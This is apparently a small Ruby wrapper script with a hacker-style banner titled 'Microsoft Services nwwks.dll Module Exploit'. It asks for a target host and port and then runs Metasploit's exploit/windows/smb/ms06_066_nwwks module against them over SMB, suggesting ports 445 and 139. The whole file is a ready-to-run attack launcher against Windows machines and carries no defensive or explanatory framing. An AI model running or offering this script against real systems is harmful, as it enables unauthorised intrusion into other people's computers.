require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
     Microsoft Services nwwks.dll Module Exploit

""".red
puts """
	 1st Try {set RPORT 445; 2nd RPORT 139}""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp



exec("msfconsole -x 'exploit/windows/smb/ms06_066_nwwks' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

